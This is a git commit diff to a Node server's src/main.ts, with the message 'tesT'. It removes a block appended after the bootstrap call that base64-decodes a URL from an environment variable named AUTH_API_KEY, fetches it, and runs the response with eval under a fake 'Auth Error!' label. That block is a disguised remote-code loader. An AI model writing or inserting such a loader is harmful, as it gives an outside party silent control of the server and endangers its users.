a3320be316a631cfd53d7690df804a23828ee6c1
QaisarWaheed <qaiserwaheed00@gmail.com>
2026-04-13 06:04:41 +0500

    tesT

--- src/main.ts
+++ src/main.ts
@@ -99,16 +99,3 @@ async function bootstrap() {
   await app.listen(port, '0.0.0.0');
 }
 void bootstrap();
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
